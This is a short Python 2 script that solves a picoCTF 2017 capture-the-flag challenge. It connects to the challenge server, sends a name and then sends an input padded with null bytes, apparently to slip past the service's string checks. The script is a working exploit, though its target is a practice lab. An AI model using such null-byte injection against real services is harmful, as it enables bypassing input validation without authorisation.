#!/usr/bin/env python
import socket

s = None

def recv_data():
    data = ""
    while True:
        buf = s.recv(4096)
        data += buf
        if len(buf) < 4096:
            return data

host = ('shell2017.picoctf.com', 5194)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(host)

print recv_data()
print recv_data()
s.send('topkek\n')
print recv_data()
print recv_data()
s.send('1\x00111111\x00\n')
print recv_data()
print recv_data()
